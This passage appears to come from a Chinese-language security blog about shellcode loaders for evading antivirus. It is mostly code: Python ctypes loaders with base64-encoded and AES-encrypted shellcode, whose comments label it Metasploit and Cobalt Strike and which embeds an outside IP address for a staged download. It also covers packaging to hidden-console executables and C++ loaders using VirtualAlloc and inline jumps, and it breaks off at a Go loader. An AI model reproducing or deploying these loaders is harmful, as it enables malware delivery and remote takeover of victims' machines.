\x48\x89\xf1\x48\x89\xda\x41\xb8\x00\x20\x00\x00\x49\x89\xf9\x41\xba\x12\x96\x89\xe2\xff\xd5\x48\x83\xc4\x20\x85\xc0\x74\xb6\x66\x8b\x07\x48\x01\xc3\x85\xc0\x75\xd7\x58\x58\x58\x48\x05\x00\x00\x00\x00\x50\xc3\xe8\x9f\xfd\xff\xff\x34\x33\x2e\x31\x33\x38\x2e\x32\x37\x2e\x31\x32\x00\x49\x96\x02\xd2&quot;</span></span><br><span class="line"><span class="comment"># print(base64.b64encode(buf))</span></span><br><span class="line">buf=<span class="string">b&#x27;/EiD5PDoyAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwJ1couAiAAAAEiFwHRnSAHQUItIGESLQCBJAdDjVkj/yUGLNIhIAdZNMclIMcCsQcHJDUEBwTjgdfFMA0wkCEU50XXYWESLQCRJAdBmQYsMSESLQBxJAdBBiwSISAHQQVhBWF5ZWkFYQVlBWkiD7CBBUv/gWEFZWkiLEulP////XWoASb53aW5pbmV0AEFWSYnmTInxQbpMdyYH/9VIMclIMdJNMcBNMclBUEFQQbo6Vnmn/9Xrc1pIicFBuGARAABNMclBUUFRagNBUUG6V4mfxv/V61lbSInBSDHSSYnYTTHJUmgAAkCEUlJBuutVLjv/1UiJxkiDw1BqCl9IifFIidpJx8D/////TTHJUlJBui0GGHv/1YXAD4WdAQAASP/PD4SMAQAA69Pp5AEAAOii////L0pPeEwAA4sClK0mPuHhpEjiwPFbEBd1CT89+tD5wnACs+t8LXD7NJ4OPkfNHcNMDDOLzntbKttAvJtee5pTiH6T8L5s3hEpLa6OojnlTwBVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgTVNJRSA5LjA7IFdpbmRvd3MgTlQgNi4xOyBXT1c2NDsgVHJpZGVudC81LjA7IEJPSUU5O0VOVVMpDQoAxiRqwJUBuR10Db9XXD1Kf2CjB+YIsZco+60hicHQOpemIh/88oSkBEhNw2mKVr/YMEQRCZ3+2xs1/tdNEUmHO02qOZUcgtP3IfO2Rg07fWaEOrrAx0IhJ2k7yhBWtvri7FfQf7ylfTDYHH5Twfdb2c4kIUpVA4gOcoBRWpI3aSL0cl6al9+cKKRuUlCUiaN0aU5/pdBsWXITtfTeIVMbn1KDhnaTnCHs1ZwxF2ADJ3HCRuqkFtrjbhHvISi36F9jGzTZ9uT2Kjv2ANoTk4gAQb7wtaJW/9VIMcm6AABAAEG4ABAAAEG5QAAAAEG6WKRT5f/VSJNTU0iJ50iJ8UiJ2kG4ACAAAEmJ+UG6EpaJ4v/VSIPEIIXAdLZmiwdIAcOFwHXXWFhYSAUAAAAAUMPon/3//zQzLjEzOC4yNy4xMgBJlgLS&#x27;</span></span><br><span class="line">buf=base64.b64decode(buf)</span><br><span class="line">shellcode = buf</span><br><span class="line">shellcode = <span class="built_in">bytearray</span>(shellcode)</span><br><span class="line"><span class="comment"># 设置VirtualAlloc返回类型为ctypes.c_uint64</span></span><br><span class="line">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="line"><span class="comment"># 申请内存</span></span><br><span class="line">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="number">0</span>), ctypes.c_int(<span class="built_in">len</span>(shellcode)), ctypes.c_int(<span class="number">0x3000</span>), ctypes.c_int(<span class="number">0x40</span>))</span><br><span class="line"><span class="comment"># 放入shellcode</span></span><br><span class="line">buf = (ctypes.c_char * <span class="built_in">len</span>(shellcode)).from_buffer(shellcode)</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="line">    ctypes.c_uint64(ptr),</span><br><span class="line">    buf,</span><br><span class="line">    ctypes.c_int(<span class="built_in">len</span>(shellcode))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 创建一个线程从shellcode放置位置首地址开始执行</span></span><br><span class="line">handle = ctypes.windll.kernel32.CreateThread(</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_uint64(ptr),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.c_int(<span class="number">0</span>),</span><br><span class="line">    ctypes.pointer(ctypes.c_int(<span class="number">0</span>))</span><br><span class="line">)</span><br><span class="line"><span class="comment"># 等待上面创建的线程运行完</span></span><br><span class="line">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-<span class="number">1</span>))</span><br></pre></td></tr></table></figure><h4 id="AES混淆">AES混淆</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex, a2b_hex</span><br><span class="line"><span class="keyword">import</span> ctypes,base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果text不足16位的倍数就用空格补足为16位</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_to_16</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(text.encode(<span class="string">&#x27;utf-8&#x27;</span>)) % <span class="number">16</span>:</span><br><span class="line">        add = <span class="number">16</span> - (<span class="built_in">len</span>(text.encode(<span class="string">&#x27;utf-8&#x27;</span>)) % <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        add = <span class="number">0</span></span><br><span class="line">    text = text + (<span class="string">&#x27;\0&#x27;</span> * add)</span><br><span class="line">    <span class="keyword">return</span> text.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密后，去掉补足的空格用strip() 去掉</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">text</span>):</span><br><span class="line">    key = <span class="string">&#x27;9999999999999999&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    iv = <span class="string">b&#x27;qqqqqqqqqqqqqqqq&#x27;</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    cryptos = AES.new(key, mode, iv)</span><br><span class="line">    plain_text = cryptos.decrypt(a2b_hex(text))</span><br><span class="line">    shellcode=<span class="built_in">bytes</span>.decode(plain_text).rstrip(<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> shellcode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zhixing</span>(<span class="params">shellcode</span>):</span><br><span class="line">    rwxpage = ctypes.windll.kernel32.VirtualAlloc(<span class="number">0</span>, <span class="built_in">len</span>(shellcode), <span class="number">0x1000</span>, <span class="number">0x40</span>)</span><br><span class="line">    ctypes.windll.kernel32.RtlMoveMemory(rwxpage, ctypes.create_string_buffer(shellcode), <span class="built_in">len</span>(shellcode))</span><br><span class="line">    handle = ctypes.windll.kernel32.CreateThread(<span class="number">0</span>, <span class="number">0</span>, rwxpage, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    ctypes.windll.kernel32.WaitForSingleObject(handle, -<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment">#msf</span></span><br><span class="line">    <span class="comment">#e=&#x27;b1f1a80ed13fac07e7f7d839e53a058e16908aa591d2b376bb04ebcccbd18f2005d456c578ce31065a5ae16e6823cfdc5b99f3d9f61eed342cf34c85a87201a29e2f6e119da6f7636c3aec6b9272cfd5e6e1882f554dbf3739f74e4df7a2f18823da1902a0424b86da0d65d10cda498e0169b3bcd73db537336df9d18ba0cc1c4e9550563c7e4f29dcfe0ddc104a172a25654dd3b75b8d8fdeba401eff9f783ba7c0b67dc79c6d7f5d8ab6dc7ce0fe3c2f65c82744b70a25d718a0f13cf031e54a30064b8f7ad4e1cff48a95af9701098a37dcd1897b54ce68a89d28bd6bd19ce792dc3625b373c34e60ed29d780f59f162fd86dc7b1c02045cf63de0a3a34af04209020efadf399d97ddc89e59a1c57ba756b589b5dc807c87d8be291917891a5bd14a6ea5fceb3163629978f067a4d9f6c223dcf29f2ce0c5af94b7f6b7b0ec93dd96bf92b316816016cabeb86a14e747db773e3cd623552237f0be1b05b9d5a7a200d18281c872b3da5cd941f633b21ff30625373f52f215e6adbaff429a51a451ce0ca1134314b24f57229465b20d1fd2e13a86480651f17939aeb78065d4a64c9f22c0263b636a2fefdacf1d62984db64d02732b71b0368042bf42d2f2c72a25c533c95eec1ede2d950e426c1e6ab007ae425f654bdabc1b2198fcf589affe811e6000cd8f05c40631e045efdc42c5bf0217e669af2ad42a9f879ba5b5aa9cb562d59458ce7bc775153d456e453fc3b95a8f2d32d280e3dd58445209f28c860c80235a039b1f49ff1d4b673d19c8a6181b7b4ab21b512e036df1faae4c1e5a15ff6554fe2d866622e62fac943b6a84a8f5eed44892598aa46973b8ed41fb7e453e979766462760a8dc915710beb422e39124d1de7dc6b4c4bc58bd95613&#x27;</span></span><br><span class="line">    <span class="comment">#cs</span></span><br><span class="line">    e=<span class="string">&#x27;0e0d6b374430510532fb94ec3f9e3e933e26c58c784e26a7a50308a6cb9286b75810a376913a4d162ce26bf16c27d8924223ea45360e595f28130c67ef3e51c6f1b21d375aaa1b97e74bab97c9b87f80842cf3597d9b5cfbe361c30c54cce15aa6fafc88fd015f303c60a96900736b35f9d8aa9f0b8f1f89133d959a633e471a6b8aa5004d271541075a6bff3dcea93036aa3ebb4621eec32350be5b73e2aa90370b97c1544258f017466e8235f03b17b282ecbd6845340ca1f87e6f58a844974aa52f1544f92df67cc29046a14c0f6528c1b20e8f82e81ff182dba4d6320082ca98bb13d28ddc7304198039b87560a12054769073faa0bb0f07ac4b12cb19c48c7d3c002d19e5e6d439f1c822e7a6fbcef094f6840aec0672d8b2b669a0fed0bbe954260658ce63e4c75e307d47528fae505ee795a14a2f0e51812119e5480a6ee0b267be2df03994c8564aac446538a6fa2d65912ee020d783603ba3fb7bb5653994418cbe6d9a30c2730c043876d5713423d60d622fbfa418f25d28f3c6599df2d4458be05e1bfbd60abc3ef71cd64812681308f73920ef7fab1318758e8a940ba7eafa3599971b841069b67ef10b88ba58b9ad13ac676700394ec521eb040acd080f491903baa8352f8db8114ea920690978aea20c30855b786124f3d27b90155ee3533ee3620a5f48d26e38b60d786d2e7ff41a07fcc9c1e0abbacfce32b5765901b576fe110bed31374b8de6c4db5316c57dda772fe5b1736b5314e2a3b8b1d665e272024dfd433b0dbd0fef3981f5087866bba50a686575e2b0f26903a54172826e0bb3713cf85b29e227c69fb6f31ca2d462decc5e3213fbb472bbd91a47316ce02b7a99122543b7db75de61e5a34944f10c08dd5ecac8f3b7e28bbe24f2cb3ef6258ef404ab222b9f128acdeec3e8dd123273fb0db73f66fe6e06e6276e3294bac412689da195e240c37b0d7803ceab2deee1a4902ef3b85a1d81a5128591a31d7b12f1773c54fbd56ebdee86f19d0cd100dd83964c8525e2f3af81c4d19603483af04b8d2d21b026ae2af9edc293c66ee40d6be7ffa35b5b0e8e5ece4f9b15097ab1471b3fa5cc8d6ee1431a8a32562641e36fc5b44c422e25482ca319882691150f8713cd8d90ed3eacec170039923a8c4b70d64773260a30d23526356c31a40675b54d6546b1c84ae338f6173eeacb03a892331dc5e9cbf0b78a2bb5ceb434d7d72441565620a9c4ab156030f35ede7dad650483cbdf8e91d64250c6dbefe3ffeaa3ea77f82f270b48a232d35fb66db49aae980180625387a8bf317beed2f612c546f015864578629c020c8f2fca445bd03c74bf7bb882d051a9b8c55ce2cc73948ad171d3a802f8bbe1b542fc36b26171d2d02e2c4cd56e2bad9983145c7011d00e5cc77967b5b980ccb9b4fd6f28efcc8538cc62d5f9ddf9e67609ce9de733109f4c8ccfbfd705d068f2e09618838270591553d662713754382047a2f8dd65e6850db61bc4ad61606e&#x27;</span></span><br><span class="line">    d = decrypt(e)  <span class="comment"># 解密</span></span><br><span class="line">    d=base64.b64decode(d)</span><br><span class="line">    zhixing(d)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Python-打包器选择-Pyinstall-Py2exe-Nuitka">#Python-打包器选择-Pyinstall&amp;Py2exe&amp;Nuitka</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、pyinstaller</span><br><span class="line">-F, –onefile 打包一个单个文件，如果你的代码都写在一个.py文件的话，可以用这个，如果是多个.py文件就别用</span><br><span class="line">-D, –onedir 打包多个文件，在dist中生成很多依赖文件，适合以框架形式编写工具代码，我个人比较推荐这样，代码易于维护</span><br><span class="line">-K, –tk 在部署时包含 TCL/TK</span><br><span class="line">-a, –<span class="built_in">ascii</span> 不包含编码.在支持Unicode的python版本上默认包含所有的编码.</span><br><span class="line">-d, –debug 产生debug版本的可执行文件</span><br><span class="line">-w,–windowed,–noconsole 使用Windows子系统执行.当程序启动的时候不会打开命令行(只对Windows有效)</span><br><span class="line">-c,–nowindowed,–console 使用控制台子系统执行(默认)(只对Windows有效)</span><br><span class="line">使用：pyinstaller -F test.py</span><br></pre></td></tr></table></figure><h4 id="py2exe">py2exe</h4><p>参考：<a href="https://hoxis.github.io/python-py2exe.html">https://hoxis.github.io/python-py2exe.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">安装：pip install py2exe</span><br><span class="line">打包：python setup.py py2exe</span><br><span class="line">代码：</span><br><span class="line">setup.py</span><br><span class="line"><span class="keyword">from</span> distutils.core <span class="keyword">import</span> setup</span><br><span class="line"><span class="keyword">import</span> py2exe</span><br><span class="line">INCLUDES = [<span class="string">&#x27;108-pickle-release&#x27;</span>] <span class="comment">#注意修改脚本项目名</span></span><br><span class="line"> </span><br><span class="line">options = &#123;</span><br><span class="line">    <span class="string">&quot;py2exe&quot;</span>:</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;compressed&quot;</span>: <span class="number">1</span>,  <span class="comment"># 0或1,1压缩，0不压缩</span></span><br><span class="line">            <span class="string">&quot;optimize&quot;</span>: <span class="number">2</span>,  <span class="comment"># 0、1、2，文件的优化级别</span></span><br><span class="line">            <span class="string">&quot;bundle_files&quot;</span>: <span class="number">1</span>,  <span class="comment"># 1、2、3,1表示所有文件打包成一个exe文件，2表示除了Python的解释器外都绑定，3表示不绑定</span></span><br><span class="line">            <span class="string">&quot;includes&quot;</span>: INCLUDES,  <span class="comment"># 列表，包含其它的一些模块</span></span><br><span class="line">            <span class="string">&quot;dll_excludes&quot;</span>: [<span class="string">&#x27;MSVCP90.dll&#x27;</span>]  <span class="comment"># 列表，包含的dll文件不会打包进exe程序</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">setup(</span><br><span class="line">    version=<span class="string">&#x27;1.0.0&#x27;</span>,</span><br><span class="line">    options=options,</span><br><span class="line">    description=<span class="string">&quot;this is a xiaodi test&quot;</span>,</span><br><span class="line">    zipfile=<span class="literal">None</span>,  <span class="comment"># 公用文件的压缩文件名称，默认为“library.zip”；如果没有，则会将这些文件放在最终的exe文件中</span></span><br><span class="line">    console=[&#123;<span class="string">&quot;script&quot;</span>: <span class="string">&#x27;108-pickle-release.py&#x27;</span>&#125;]  <span class="comment"># 生成一个控制台形式的exe程序，对应的有windows=[]，生成GUI形式的exe程序</span></span><br><span class="line">)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Nuitka">Nuitka</h4><p>参考:<a href="https://jiesonshan.github.io/2020/05/27/Nuitka%E6%89%93%E5%8C%85python%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/">https://jiesonshan.github.io/2020/05/27/Nuitka%E6%89%93%E5%8C%85python%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</a></p><p><a href="https://juejin.cn/post/7109310663851245605">https://juejin.cn/post/7109310663851245605</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">--standalone：方便移植到其他机器，不用再安装python</span><br><span class="line">--show-memory --show-progress：展示整个安装的进度过程</span><br><span class="line">--nofollow-imports：不编译代码中所有的<span class="keyword">import</span></span><br><span class="line">--follow-<span class="keyword">import</span>-to=utils,src：需要编译成C++代码的指定的<span class="number">2</span>个包含源码的文件夹，这里用,来进行分隔。</span><br><span class="line">--output-<span class="built_in">dir</span>=out：指定输出的结果路径为out。</span><br><span class="line">--windows-disable-console：运行exe取消弹框。</span><br><span class="line">--mingw64 <span class="comment">#默认为已经安装的vs2017去编译，否则就按指定的比如mingw(官方建议)</span></span><br><span class="line">--standalone 独立环境，这是必须的(否则拷给别人无法使用)</span><br><span class="line">--windows-disable-console 没有CMD控制窗口</span><br><span class="line">--output-<span class="built_in">dir</span>=out 生成exe到out文件夹下面去</span><br><span class="line">--show-progress 显示编译的进度，很直观</span><br><span class="line">--show-memory 显示内存的占用</span><br><span class="line">--include-qt-plugins=sensible,styles 打包后PyQt的样式就不会变了</span><br><span class="line">--plugin-enable=qt-plugins 需要加载的PyQt插件</span><br><span class="line">--plugin-enable=tk-inter 打包tkinter模块的刚需</span><br><span class="line">--plugin-enable=numpy 打包numpy,pandas,matplotlib模块的刚需</span><br><span class="line">--plugin-enable=torch 打包pytorch的刚需</span><br><span class="line">--plugin-enable=tensorflow 打包tensorflow的刚需</span><br><span class="line">--windows-icon-<span class="keyword">from</span>-ico=你的.ico 软件的图标</span><br><span class="line">--windows-company-name=Windows下软件公司信息</span><br><span class="line">--windows-product-name=Windows下软件名称</span><br><span class="line">--windows-file-version=Windows下软件的信息</span><br><span class="line">--windows-product-version=Windows下软件的产品信息</span><br><span class="line">--windows-file-description=Windows下软件的作用描述</span><br><span class="line">--windows-uac-admin=Windows下用户可以使用管理员权限来安装</span><br><span class="line">--linux-onefile-icon=Linux下的图标位置</span><br><span class="line">--onefile 像pyinstaller一样打包成单个exe文件</span><br><span class="line">--include-package=复制比如numpy,PyQt5 这些带文件夹的叫包或者轮子</span><br><span class="line">--include-module=复制比如when.py 这些以.py结尾的叫模块</span><br><span class="line">使用：nuitka --mingw64 --standalone --show-memory --show-progress --nofollow-imports --follow-<span class="keyword">import</span>-to=utils,src --output-<span class="built_in">dir</span>=out <span class="number">108.</span>py</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="C-加载器">C++加载器</h3><p>对于C/C++来说，常用的加载方式有<strong>函数指针执行、内联汇编指令、伪指令等方式</strong>.</p><h4 id="函数指针执行">函数指针执行</h4><p>简单的C代码:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span> </span>&#123;</span><br><span class="line">    (*(<span class="built_in">void</span>(*)() shellcode)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>(void(*)() shellcode</strong> 将shellcode转换为函数指针，指向void形式的函数，然后再通过一个*对指针进行取值，之后通过()双括号调用函数进而执行shell从而执行shellocde。</p><h4 id="动态内存加载">动态内存加载</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = </span><br><span class="line"><span class="string">&quot;shellcode&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">char</span> *Memory; </span><br><span class="line"></span><br><span class="line"> Memory=<span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(Memory, buf, <span class="built_in">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line"> ((<span class="built_in">void</span>(*)())Memory)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原理和上面python实现类似。</p><h4 id="内联汇编指令">内联汇编指令</h4><p>汇编指令相关的知识可以看这里:</p><p><a href="https://www.cxyzjd.com/article/Hkenter/2855771">https://www.cxyzjd.com/article/Hkenter/2855771</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">include &lt;stdio.h&gt;</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//#pragma comment(linker,&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)  // 隐藏控制台窗口显示</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/INCREMENTAL:NO&quot;</span>)                                     <span class="comment">// 减小编译体积</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker, <span class="string">&quot;/section:.data,RWE&quot;</span>)                                 <span class="comment">// 启用数据段可读写</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] =</span><br><span class="line"><span class="string">&quot;\xd9\xc5\xd9\x74\x24\xf4\xba\x8b\xfc\x02\xdd\x5e\x2b\xc9\xb1&quot;</span></span><br><span class="line"><span class="string">&quot;\x56\x83\xee\xfc\x31\x56\x14\x03\x56\x9f\x1e\xf7\x21\x77\x5c&quot;</span></span><br><span class="line"><span class="string">&quot;\xf8\xd9\x87\x01\x70\x3c\xb6\x01\xe6\x34\xe8\xb1\x6c\x18\x04&quot;</span></span><br><span class="line"><span class="string">&quot;\x39\x20\x89\x9f\x4f\xed\xbe\x28\xe5\xcb\xf1\xa9\x56\x2f\x93&quot;</span></span><br><span class="line"><span class="string">&quot;\xca\xec\x3f\xcd\x34\xa2\x40\xc4&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">  mov eax, offset shellcode;</span><br><span class="line">  JMP EAX</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其他写法</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">RunShellCode</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    __asm  </span><br><span class="line">        &#123;  </span><br><span class="line">        lea eax, shellcode;  </span><br><span class="line">    jmp eax;  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>MOV EAX, offset shellcode</strong><font style="color:rgb(52, 73, 94);background-color:rgb(254, 254, 254);"><br></font>此指令意为将 shellcode 放入到寄存器 EAX 中</p><p><strong>JMP EAX</strong><font style="color:rgb(52, 73, 94);background-color:rgb(254, 254, 254);"><br></font>无条件跳转到EAX</p><h4 id="伪指令">伪指令</h4><p>伪指令(Pseudo Instruction)是用于对汇编过程进行控制的指令，该类指令并不是可执行指令，没有机器代码，只用于汇编过程中为汇编程序提供汇编信息。 例如，提供如下信息：哪些是指令、哪些是数据及数据的字长、程序的起始地址和结束地址等。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">RunShellCode_5</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    __asm  </span><br><span class="line">    &#123;  </span><br><span class="line">        mov eax, offset shellcode;  </span><br><span class="line">        _emit <span class="number">0xFF</span>;  </span><br><span class="line">        _emit <span class="number">0xE0</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="go加载器">go加载器</h3><p><a href="https://www.cnblogs.com/newbe3three/p/16214882.html">https://www.cnblogs.com/newbe3three/p/16214882.html</a></p><p><a href="https://cn-sec.com/archives/981565.html">https://cn-sec.com/archives/981565.html</a></p><h4 id="动态内存加载-2">动态内存加载</h4><p>核心代码如下:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 